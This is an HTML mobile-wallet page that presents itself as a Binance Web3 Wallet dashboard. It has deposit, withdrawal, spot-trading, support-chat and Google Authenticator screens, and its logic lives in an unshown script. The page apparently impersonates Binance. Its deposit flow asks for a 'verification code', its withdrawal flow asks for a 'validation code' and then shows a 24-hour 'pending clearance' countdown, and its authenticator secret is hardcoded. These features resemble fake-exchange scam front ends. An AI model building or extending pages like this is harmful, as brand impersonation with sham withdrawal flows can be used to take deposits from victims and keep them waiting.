<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Binance Web3 Wallet Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- TailwindCSS -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- CoinGecko & TradingView -->
  <script src="https://s3.tradingview.com/tv.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/davidshimjs-qrcodejs@0.0.2/qrcode.min.js"></script>
  <link rel="icon" href="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" />
  <style>
    :root {
      --accent: #f0b90b;
      --accent2: #ffd43b;
      --danger: #f6465d;
      --success: #0ecb81;
      --dark: #07070b;
      --bg: #0d0e11;
      --card: #16181b;
      --surface: #17171d;
      --muted: #9aa0a6;
      --text: #e6e9eb;
    }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'Inter', ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
      margin: 0;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
    }
    .card { background-color: var(--card); border-radius: 12px; border: 1px solid #23262f; }
    .app-container { max-width: 520px; margin: 0 auto; min-height: 100vh; display: flex; flex-direction: column; }
    #footer-nav { position: fixed; bottom: 0; left: 0; right: 0; max-width: 520px; margin: 0 auto; background: var(--card); border-top: 1px solid #24242d; z-index: 50; }
    .footer-btn.active { color: var(--accent); }
    .footer-btn { color: #9aa0a6; transition: color .2s; }
    #modal-container, #loading-modal { transition: opacity .2s; }
    .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,.8); display: flex; align-items: center; justify-content: center; z-index: 100; }
    .modal-content { background: var(--card); border-radius: 12px; padding: 24px; width: 95%; max-width:400px; box-shadow: 0 8px 32px rgba(0,0,0,0.55); }
    #notification-banner { z-index:99; position: fixed; top: 0; left: 0; right: 0; max-width: 520px; margin:0 auto; background: linear-gradient(90deg,#fcd535,#f9e074,#fffbdc); color: #191a1b; padding: 14px 18px; border-radius: 0 0 16px 16px; box-shadow: 0 2px 12px rgba(0,0,0,0.13); display:none }
    .btn-primary { background: var(--accent); color: #181a20; font-weight: bold; border-radius: 8px; padding: 12px 0; width:100%; }
    .btn-primary:hover { background: var(--accent2); }
    .btn-secondary { background: var(--surface); color: var(--text); }
    .icon-btn { background: rgba(255,255,255,0.04); border-radius: 50%; padding: 10px; transition:background .2s;}
    .icon-btn:hover { background:rgba(255,255,255,0.08);}
    .input-field { background-color:var(--surface); border: 1px solid #20222b; color: var(--text); padding: 12px; border-radius: 8px; width: 100%; }
    .flex-center { display:flex;align-items:center;justify-content:center;}
    .hidden { display: none !important;}
    /* Custom scrollbars for chat/activity lists */
    .scrollbar::-webkit-scrollbar, #chat-box::-webkit-scrollbar { width:5px;}
    .scrollbar::-webkit-scrollbar-thumb, #chat-box::-webkit-scrollbar-thumb { background: #f0b90b66; border-radius: 3px;}
  </style>
</head>
<body>
<div class="app-container">
  <!-- GLOBAL HEADER -->
  <header id="header" class="sticky top-0 z-40 card p-4 border-b border-gray-800 flex items-center justify-between">
    <div class="flex gap-3 items-center">
      <img src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" class="w-9 h-9 rounded-full" alt="Binance Logo" />
      <h1 class="text-xl font-bold text-accent">Web3 Wallet</h1>
    </div>
    <div class="flex items-center gap-2">
      <button onclick="openNotifications()" class="icon-btn" title="Notifications">
        <!-- Bell SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400 hover:text-yellow-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.03 2.03 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.34C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/>
        </svg>
        <span id="notification-dot" class="absolute top-3 right-[125px] w-2 h-2 bg-red-500 rounded-full hidden"></span>
      </button>
      <button onclick="openSearch()" class="icon-btn" title="Search">
        <!-- Search SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400 hover:text-yellow-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
        </svg>
      </button>
      <button onclick="showPage('supportPage')" class="icon-btn" title="Support Chat">
        <!-- Chat SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400 hover:text-yellow-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 4v-4z"/>
        </svg>
      </button>
      <button onclick="toggleMoreMenu()" class="icon-btn" title="More">
        <!-- Dots SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400 hover:text-accent" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <circle cx="6" cy="12" r="2"/>
          <circle cx="12" cy="12" r="2"/>
          <circle cx="18" cy="12" r="2"/>
        </svg>
      </button>
      <button id="btnConnect" onclick="connectWallet()" class="ml-3 btn-primary text-sm font-semibold transition">Connect Wallet</button>
    </div>
    <!-- More menu dropdown -->
    <div id="moreMenu" class="absolute right-4 top-16 w-48 card shadow-xl rounded-lg z-50 hidden flex-col">
      <button onclick="showPage('accountDetailsPage')" class="block text-left px-4 py-3 text-sm hover:bg-gray-700">Account Details</button>
      <button onclick="showPage('settingsPage')" class="block text-left px-4 py-3 text-sm hover:bg-gray-700">Settings</button>
      <button onclick="disconnectWallet()" class="block text-left px-4 py-3 text-sm text-red-400 hover:bg-gray-700">Disconnect</button>
      <button onclick="closeAccount()" class="block text-left px-4 py-3 text-sm text-red-500 hover:bg-gray-700 rounded-b-lg">Close Account</button>
    </div>
  </header>

  <!-- Daily Market Pop Banner -->
  <div id="notification-banner" onclick="hideNotificationBanner()">
    <span id="banner-text" class="font-medium">Market update: Loading...</span>
    <button class="ml-4 p-1 rounded-full float-right" onclick="hideNotificationBanner()" style="background:none;border:none;outline:none;">
      <svg class="w-4 h-4 text-gray-700" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
      </svg>
    </button>
  </div>

  <!-- PAGE CONTAINER -->
  <div id="pageContainer" class="scrollbar overflow-y-auto pb-20">

    <!-- ----------------- HOMEPAGE DASHBOARD ----------------- -->
    <div id="home" class="page-content pt-2">
      <!-- 1. User Account ID Section -->
      <div class="card p-5 mb-3">
        <div class="flex justify-between items-center">
          <p class="text-sm text-muted">User Account ID</p>
          <p id="wallet-id-display" class="text-sm font-mono text-accent"></p>
        </div>
      </div>

      <!-- 2. Total Balance Section -->
      <div class="card p-5 mb-3">
        <p class="text-sm text-muted">Total Balance (USD)</p>
        <div class="flex items-end justify-between">
          <h2 id="total-balance" class="text-4xl font-bold mt-2">$0.00</h2>
          <span id="balance-percentage" class="text-sm font-semibold text-success ml-2"></span>
        </div>
        <div class="flex space-x-4 mt-6">
          <!-- Deposit Button -->
          <button onclick="openDepositPage()" class="flex-1 flex flex-col items-center p-3 rounded-xl bg-accent text-black hover:bg-yellow-400 transition font-semibold">
            <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" style="color: currentColor;">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/>
            </svg>
            <span class="mt-1 text-xs font-semibold">Deposit</span>
          </button>
          <!-- Withdraw Button -->
          <button onclick="openWithdraw()" class="flex-1 flex flex-col items-center p-3 rounded-xl bg-danger text-white hover:bg-danger/90 transition font-semibold">
            <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 12H4m12 4l-4-4m0 0l-4-4"/>
            </svg>
            <span class="mt-1 text-xs font-semibold">Withdraw</span>
          </button>
        </div>
      </div>

      <!-- 3. Holdings Section -->
      <div class="card p-5 mb-3">
        <h3 class="font-semibold text-lg mb-3">Holdings</h3>
        <div id="holdings-list">
          <p class="text-muted text-center py-4">Connect wallet to view holdings.</p>
        </div>
      </div>

      <!-- 4. Transactions & Activity Section -->
      <div class="card p-5 mb-3">
        <h3 class="font-semibold text-lg mb-3">Transactions & Activity</h3>
        <div id="activity-list">
          <p class="text-muted text-center py-2">No recent activities.</p>
        </div>
      </div>

      <!-- 5. Live Prices Performance Chart -->
      <div class="card p-5 mb-3">
        <h3 class="font-semibold text-lg mb-3">BTCUSDT Live Price</h3>
        <div id="tv-chart-container" style="height:400px;border-radius:10px;overflow:hidden;">
          <p class="text-center text-muted py-20">Loading chart...</p>
        </div>
      </div>

      <!-- 6. Hot Coins Section -->
      <div class="card p-5 mb-3">
        <h3 class="font-semibold text-lg mb-3">Hot Coins</h3>
        <div id="hot-coins-list" class="space-y-2">
          <p class="text-muted text-center py-4">Loading hot coins...</p>
        </div>
      </div>
    </div>

    <!-- ---------- MARKET PAGE ----------- -->
    <div id="marketPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Market Overview</h2>
      <div class="card p-4 mb-4">
        <h3 class="font-semibold text-lg mb-2 flex items-center">
          <svg class="h-5 w-5 mr-2 text-accent" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 20H5a2 2 0 01-2-2V6a2 2 0 012-2h10a2 2 0 012 2v10m-7-2l3-3m0 0l3 3m-3-3v8M8 12h.01M12 12h.01M16 12h.01" /></svg>
          Market News & Launch Pool
        </h3>
        <div id="market-news" class="space-y-2 text-sm text-gray-300">
          <p>Fetching market news...</p>
        </div>
      </div>
      <div class="card p-4 mb-4">
        <h3 class="font-semibold text-lg mb-2">Market Cap Performance</h3>
        <div id="tv-market-chart" style="height:400px;border-radius:8px;overflow:hidden;">
          <p class="text-center text-muted py-20">Loading chart...</p>
        </div>
      </div>
      <div class="card p-4 mb-4">
        <h3 class="font-semibold text-lg mb-2 flex items-center">
          <svg class="h-5 w-5 mr-2 text-success" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c1.657 0 3 .895 3 2s-1.343 2-3 2-3-.895-3-2 1.343-2 3-2zM9 16h6v-1a3 3 0 00-3-3h0a3 3 0 00-3 3v1z" /></svg>
          Top Coins List
        </h3>
        <div id="top-coins-list" class="divide-y divide-gray-800">
          <p class="text-muted text-center py-4">Fetching top coins...</p>
        </div>
      </div>
    </div>

    <!-- ---------- TRADE PAGE ----------- -->
    <div id="tradePage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-2">Spot Trading</h2>
      <div class="flex justify-between items-center mb-4 p-3 card">
        <div class="flex items-center gap-2">
          <span id="trade-pair-display" class="text-xl font-bold">BTC/USDT</span>
          <button onclick="changePairSelector()" class="icon-btn">
            <svg class="h-4 w-4 text-gray-300" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" /></svg>
          </button>
        </div>
        <span id="trade-price-display" class="text-lg font-mono text-success">Loading...</span>
      </div>
      <div id="tv-trade-chart" class="card mb-4" style="height:400px;border-radius:12px;">
        <p class="text-center text-muted py-20">Loading chart...</p>
      </div>
      <div class="flex space-x-4">
        <div class="flex-1 card p-4 rounded-xl space-y-3 border-l-4 border-success">
          <h4 class="text-lg font-semibold text-success">BUY BTC</h4>
          <input type="number" placeholder="Amount (USDT)" class="input-field"/>
          <input type="number" placeholder="Price (Optional)" class="input-field"/>
          <div class="flex justify-between text-sm text-muted">
            <span>Available:</span>
            <span id="trade-available-balance">$0.00 USDT</span>
          </div>
          <button class="btn-primary">Buy</button>
        </div>
        <div class="flex-1 card p-4 rounded-xl space-y-3 border-l-4 border-danger">
          <h4 class="text-lg font-semibold text-danger">SELL BTC</h4>
          <input type="number" placeholder="Amount (BTC)" class="input-field"/>
          <input type="number" placeholder="Price (Optional)" class="input-field"/>
          <div class="flex justify-between text-sm text-muted">
            <span>Available:</span>
            <span>0.00 BTC</span>
          </div>
          <button class="btn-primary bg-danger text-white">Sell</button>
        </div>
      </div>
    </div>

    <!-- -------- ACCOUNT PAGE ---------- -->
    <div id="accountPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Account</h2>
      <div id="account-details-card" class="card p-4 mb-4">
        <div id="account-status">
          <p class="text-lg font-semibold mb-2">Wallet Status: <span class="text-danger">Disconnected</span></p>
          <button onclick="connectWallet()" class="btn-primary">Connect Wallet</button>
        </div>
        <div id="account-info" class="hidden">
          <div class="mb-3"><p class="text-sm text-muted">User Account ID</p><p id="acc-user-id" class="text-lg font-mono"></p></div>
          <div class="mb-3"><p class="text-sm text-muted">Connected Wallet</p><p id="acc-wallet-addr" class="text-lg font-mono text-gray-300"></p></div>
          <div class="mb-3"><p class="text-sm text-muted">Deposit Balance</p><p id="acc-total-balance" class="text-lg font-bold text-accent"></p></div>
          <button onclick="showPage('accountDetailsPage')" class="btn-secondary mb-3">Account Details Panel</button>
          <button onclick="disconnectWallet()" class="btn-primary bg-danger text-white">Disconnect Wallet</button>
        </div>
      </div>
      <div class="card p-4 mb-4">
        <h3 class="font-semibold text-lg mb-3">Transactions & Activity</h3>
        <div id="account-activity-list" class="text-sm space-y-2"></div>
      </div>
    </div>

    <!-- ------ SUPPORT CHAT (Gemini AI) ------- -->
    <div id="supportPage" class="page-content pt-2 hidden" style="min-height:550px;">
      <h2 class="text-2xl font-bold mb-4">Support Chat (Gemini AI)</h2>
      <div id="chat-box" class="card p-4 h-96 overflow-y-scroll mb-4 space-y-4">
        <div class="flex justify-start">
          <div class="bg-gray-700 p-3 rounded-2xl rounded-bl-none max-w-[80%] text-sm">
            Welcome! I'm your Web3 Assistant. How can I help you with your wallet or market data today?
          </div>
        </div>
      </div>
      <div class="flex space-x-2">
        <input id="chat-input" type="text" placeholder="Type your message..." class="input-field flex-1" onkeydown="if(event.key === 'Enter') sendChatMessage()" />
        <button onclick="sendChatMessage()" class="bg-accent p-3 rounded-lg font-semibold">
          <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 20 20" fill="currentColor"><path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 00.183.323l.164.225h.001c.146.166.363.262.584.262h14c.22 0 .438-.096.584-.262l.164-.225a1 1 0 00.183-.323l-7-14z" /></svg>
        </button>
      </div>
    </div>

    <!-- ------ NOTIFICATION PAGE ------- -->
    <div id="notificationPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Notifications</h2>
      <div class="card p-4 mb-4 flex justify-between items-center">
        <span class="font-semibold">Receive Daily Market Updates</span>
        <label class="switch relative inline-block w-12 h-6">
          <input type="checkbox" id="notification-toggle" onchange="toggleNotifications()" checked>
          <span class="slider round absolute cursor-pointer top-0 left-0 right-0 bottom-0 bg-gray-600 transition duration-300 rounded-full before:absolute before:content-[''] before:h-5 before:w-5 before:left-0.5 before:bottom-0.5 before:bg-white before:rounded-full before:transition before:duration-300"></span>
        </label>
      </div>
      <div id="notification-list" class="space-y-3">
        <p class="text-muted text-center py-4">Loading latest notifications...</p>
      </div>
    </div>

    <!-- ------ SEARCH PAGE ------- -->
    <div id="searchPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Search</h2>
      <input id="search-input" type="text" placeholder="Search coins, markets, news..." class="input-field text-lg mb-4" oninput="liveSearch()" />
      <div id="search-results" class="space-y-3">
        <p class="text-muted text-center py-4">Start typing to see results...</p>
      </div>
    </div>

    <!-- ------ ACCOUNT DETAILS PAGE ------- -->
    <div id="accountDetailsPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Account Details</h2>
      <div class="card p-4 mb-4 space-y-4">
        <div><p class="text-sm text-muted">User Account ID</p><p id="det-user-id" class="text-lg font-mono"></p></div>
        <div><p class="text-sm text-muted">Connected Address</p><p id="det-wallet-addr" class="text-lg font-mono text-gray-300"></p></div>
        <div><p class="text-sm text-muted">Wallet Balance</p><p id="det-total-balance" class="text-lg font-bold text-accent"></p></div>
      </div>
      <button onclick="showPage('googleAuthPage')" class="btn-primary bg-danger text-white">Secure Account (Google Authentication)</button>
      <button onclick="showPage('accountPage')" class="btn-secondary mt-3">← Back to Account</button>
    </div>

    <!-- ------ GOOGLE AUTH PAGE ------- -->
    <div id="googleAuthPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Google Authentication Verification</h2>
      <div class="card p-4 mb-4 space-y-4 text-center">
        <p class="text-sm text-muted">Scan this QR code with your Google Authenticator app.</p>
        <div class="flex justify-center"><div id="ga-qrcode" class="p-4 bg-white rounded-lg"></div></div>
        <p class="text-sm text-muted">Or manually enter the Secret Key:</p>
        <p id="ga-secret-key" class="text-lg font-mono break-all font-semibold bg-gray-900 p-2 rounded-lg">A4B8 C5D2 E7F1 H9G3</p>
      </div>
      <div class="card p-4 mb-4 space-y-3">
        <p class="text-sm text-muted">Enter Google Authenticator 6-digit code</p>
        <input id="ga-code-input" type="text" placeholder="------" maxlength="6" class="input-field text-center text-3xl tracking-widest" />
        <p id="ga-error" class="text-danger text-sm hidden">Invalid code. Please try again.</p>
        <button onclick="verifyGoogleAuthCode()" class="btn-primary">Verify Code</button>
      </div>
      <button onclick="showPage('accountDetailsPage')" class="btn-secondary mt-3">← Back</button>
    </div>

    <!-- ------ DEPOSIT PAGES ------- -->
    <!-- Coin selection page -->
    <div id="depositCoinSelectPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-3">Deposit Asset</h2>
      <input id="depositSearch" type="text" placeholder="Search coin (e.g., BTC, ETH)" class="input-field text-lg mb-4" />
      <div id="depositCoinList" class="space-y-3 h-96 overflow-y-auto"></div>
      <button onclick="showPage('home')" class="btn-secondary mt-3">← Back</button>
    </div>
    <!-- Network selection page -->
    <div id="depositNetworkPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-3">Select Deposit Network</h2>
      <p class="text-sm text-muted mb-2">Selected Coin: <span id="depositCoinName" class="font-semibold text-accent"></span></p>
      <div id="networkSelectionList" class="space-y-3"></div>
      <button onclick="showPage('depositCoinSelectPage')" class="btn-secondary mt-3">← Back to Coin Selection</button>
    </div>
    <!-- Deposit address page -->
    <div id="depositAddressPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-2">Deposit Address</h2>
      <p class="text-sm text-muted mb-2">Network: <span id="depositNetworkHeader" class="font-semibold text-accent"></span></p>
      <div class="card p-6 mb-4 text-center space-y-4">
        <div id="qrcode" class="flex justify-center"></div>
        <p id="depositAddressDisplay" class="text-base font-mono break-all font-semibold bg-gray-900 p-3 rounded-lg"></p>
        <button onclick="copyDepositAddress()" class="btn-secondary">Copy Address</button>
      </div>
      <div class="card p-4 mb-4 space-y-3">
        <p class="text-sm text-muted">Enter Deposit Amount</p>
        <div class="flex items-center space-x-2">
          <input id="depositAmountInput" type="number" placeholder="0.00" class="input-field text-lg flex-1" />
          <span class="text-lg font-semibold text-gray-300" id="depositAmountSymbol">USDT</span>
        </div>
      </div>
      <button onclick="showDepositConfirmationPage()" class="btn-primary">Confirm Deposit Amount</button>
      <button onclick="showPage('depositNetworkPage')" class="btn-secondary mt-3">← Back to Network</button>
    </div>
    <!-- Deposit confirmation page -->
    <div id="depositConfirmPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-3">Confirm Deposit</h2>
      <div class="card p-4 mb-4 space-y-3">
        <p class="text-sm text-muted">Amount to Confirm:</p>
        <p id="depositConfirmAmount" class="text-3xl font-bold text-accent">$0.00</p>
        <div class="divider"></div>
        <p class="text-sm text-muted">Enter 6-digit verification code:</p>
        <input id="depositVerificationCode" type="text" placeholder="------" maxlength="6" class="input-field text-center text-3xl tracking-widest" />
        <p id="depositCodeError" class="text-danger text-sm hidden">Error message</p>
      </div>
      <button onclick="handleDepositConfirmation()" class="btn-primary bg-success">Process Deposit</button>
      <button onclick="showPage('depositAddressPage')" class="btn-secondary mt-3">← Back</button>
    </div>
    <!-- Deposit Success Modal Add Token -->
    <div id="deposit-success-modal" class="modal-overlay hidden">
      <div class="modal-content space-y-4">
        <h3 class="text-xl font-bold">Deposit Successful</h3>
        <p id="deposit-success-body" class="text-gray-300"></p>
        <button onclick="addDepositTokenToHoldings()" class="btn-primary" id="add-token-btn">Add Token</button>
        <button onclick="hideModal('deposit-success-modal')" class="btn-secondary">Cancel</button>
      </div>
    </div>

    <!-- ------ WITHDRAWAL FLOW PAGES ------- -->
    <!-- Withdraw Selection -->
    <div id="withdrawalSelector" class="modal-overlay hidden items-end">
      <div class="modal-content w-full max-w-[520px] p-4 space-y-4">
        <h2 class="text-xl font-bold mb-2">Withdrawal Options</h2>
        <button onclick="showWithdrawalDetails('on-chain')" class="btn-secondary">On-Chain Transfer</button>
        <button onclick="showWithdrawalDetails('account-id')" class="btn-secondary">User Account ID</button>
        <button onclick="hideModal('withdrawalSelector')" class="btn-secondary">Cancel</button>
      </div>
    </div>
    <!-- Withdraw Details Page -->
    <div id="withdrawDetailsPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-3">Withdraw USDT (On-Chain)</h2>
      <div class="card p-5 mb-4">
        <p class="text-sm text-muted mb-1">Enter Withdrawal Address</p>
        <div class="flex items-center gap-2">
          <input id="withdraw-address-input" type="text" placeholder="0x..." class="input-field flex-1" />
          <button onclick="fillConnectedWalletAddress()" class="btn-secondary">Fill from connected wallet</button>
        </div>
      </div>
      <div class="card p-5 mb-4">
        <p class="text-sm text-muted mb-1">Select Network</p>
        <button onclick="toggleNetworkSelection()" id="networkSelectBtn" class="input-field flex items-center justify-between">
          <span id="selectedNetworkDisplay">Select Network</span>
          <svg class="w-4 h-4 text-muted" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div id="networkSelectionDropdown" class="card absolute w-full max-w-[420px] left-0 mt-2 z-50 hidden">
          <button onclick="selectWithdrawalNetwork('ETC_ETHEREUM','ETC Ethereum network')" class="btn-secondary">ETC Ethereum network</button>
          <button onclick="selectWithdrawalNetwork('BTC_BITCOIN','BTC Bitcoin network')" class="btn-secondary">BTC Bitcoin network</button>
          <button onclick="selectWithdrawalNetwork('BNB_BEP20','BNB Smart Chain BEP20 Network')" class="btn-secondary">BNB Smart Chain BEP20 Network</button>
          <button onclick="selectWithdrawalNetwork('TRON_TRC20','Tron TRC 20 network')" class="btn-secondary">Tron TRC 20 network</button>
        </div>
      </div>
      <div class="card p-5 mb-4">
        <p class="text-sm text-muted mb-1">Enter Withdrawal Amount (USDT)</p>
        <div class="flex items-center gap-2">
          <input id="withdraw-amount-input" type="number" placeholder="0.00" class="input-field text-lg flex-1" />
          <button onclick="setMaxWithdrawAmount()" class="btn-secondary">Max</button>
        </div>
        <div class="flex justify-between text-sm text-muted pt-2">
          <span>Gas Fee:</span>
          <span>0.034 BNB</span>
        </div>
      </div>
      <button onclick="showWithdrawalConfirmation()" class="btn-primary bg-danger text-white mb-2">Withdraw</button>
      <button onclick="showPage('home')" class="btn-secondary mt-2">← Back</button>
    </div>
    <!-- Withdraw Confirmation Page -->
    <div id="withdrawConfirmPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-3">Withdrawal Confirmation</h2>
      <div class="card p-5 space-y-3">
        <div>
          <p class="text-sm text-muted">Address: <span id="conf-addr" class="font-mono break-all text-gray-300"></span></p>
          <p class="text-sm text-muted">Network: <span id="conf-net" class="font-mono text-gray-300"></span></p>
          <p class="text-sm text-muted">Amount: <span id="conf-amt" class="font-bold text-accent"></span></p>
        </div>
        <div class="divider"></div>
        <p class="text-sm text-muted">Enter validation code (6-digit):</p>
        <input id="withdraw-validation-code" type="text" placeholder="------" maxlength="6" class="input-field text-center text-3xl tracking-widest" />
        <p id="withdraw-error" class="text-danger text-sm hidden">Error message</p>
      </div>
      <button onclick="submitWithdrawalConfirmation()" class="btn-primary bg-success">Submit</button>
      <button onclick="showPage('withdrawDetailsPage')" class="btn-secondary mt-3">← Back</button>
    </div>
    <!-- Withdraw Processing Page -->
    <div id="withdrawalProcessingPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-2 flex items-center text-yellow-500">
        <svg class="w-6 h-6 mr-2 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
        Withdrawal Processing
      </h2>
      <div class="card p-4 mb-4 space-y-3">
        <p class="text-sm text-muted">Your withdrawal has been initiated and is now pending clearance.</p>
        <div class="divider"></div>
        <p class="text-sm text-muted">Withdrawal Address: <span id="proc-addr" class="font-mono break-all text-gray-300"></span></p>
        <p class="text-sm text-muted">Network: <span id="proc-net" class="font-mono text-gray-300"></span></p>
        <p class="text-sm text-muted">Amount: <span id="proc-amt" class="font-bold text-accent"></span></p>
        <div class="divider"></div>
        <p class="text-sm text-muted">Estimated remaining time for final clearance:</p>
        <p id="proc-countdown" class="text-3xl font-bold text-center text-yellow-500">24:00:00</p>
      </div>
      <button onclick="showPage('home')" class="btn-primary bg-accent">View Withdrawal Details (Activity Section)</button>
    </div>

    <!-- ------- MODALS & LOADING ------- -->
    <div id="loading-modal" class="modal-overlay hidden">
      <div class="modal-content text-center">
        <svg class="animate-spin h-8 w-8 text-accent mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.836 3.104A9.914 9.914 0 0012 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 3l-4 4m0-4l4 4" /></svg>
        <p id="loading-text" class="mt-3 text-lg font-semibold">Loading...</p>
      </div>
    </div>
    <div id="modal-container" class="modal-overlay hidden">
      <div class="modal-content space-y-4">
        <h3 id="modal-title" class="text-xl font-bold">Title</h3>
        <p id="modal-body" class="text-gray-300"></p>
        <div class="flex justify-end gap-2">
          <button onclick="hideModal('modal-container')" class="btn-secondary">OK</button>
        </div>
      </div>
    </div>
  </div>

  <!-- FOOTER NAVIGATION BUTTONS -->
  <nav id="footer-nav" class="flex justify-around p-2 card">
    <button onclick="showPage('home')" class="footer-btn flex flex-col items-center p-2 active" data-page="home">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8h5z"/></svg><span class="mt-1">Home</span>
    </button>
    <button onclick="showPage('marketPage')" class="footer-btn flex flex-col items-center p-2" data-page="marketPage">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10"/><rect x="6" y="16" width="2" height="2"/><rect x="16" y="16" width="2" height="2"/><rect x="6" y="6" width="2" height="2"/><rect x="16" y="6" width="2" height="2"/><rect x="10" y="10" width="4" height="4"/></svg><span class="mt-1">Market</span>
    </button>
    <button onclick="showPage('tradePage')" class="footer-btn flex flex-col items-center p-2" data-page="tradePage">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="currentColor" viewBox="0 0 24 24"><path d="M16 8h2l-3 4-3-4h2V4h2v4zM8 16H6l3-4 3 4H8v4H6v-4zM2 12c0-5.52 4.48-10 10-10s10 4.48 10 10-4.48 10-10 10S2 17.52 2 12z"/></svg><span class="mt-1">Trade</span>
    </button>
    <button onclick="showPage('accountPage')" class="footer-btn flex flex-col items-center p-2" data-page="accountPage">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M6 16c0-2.12 3.58-4 6-4s6 1.88 6 4v4H6z"/></svg><span class="mt-1">Account</span>
    </button>
  </nav>
</div>

<!-- MAIN LOGIC: All JS below -- see detailed merging/code in previous binance files -->
<script src="binance-dashboard-merged.js"></script>
<!-- You should merge and optimize the main JS based on all the deeply detailed logic and page states from your 3 reference files, ensuring all interactions (wallet connect, CoinGecko API, TradingView charts, deposit/withdrawal flows, search, chat, notifications, modals, activity rendering, and persistent state) work and follow all specified requirements, Binance UI style, and core flows. -->
</script>
</body>
</html>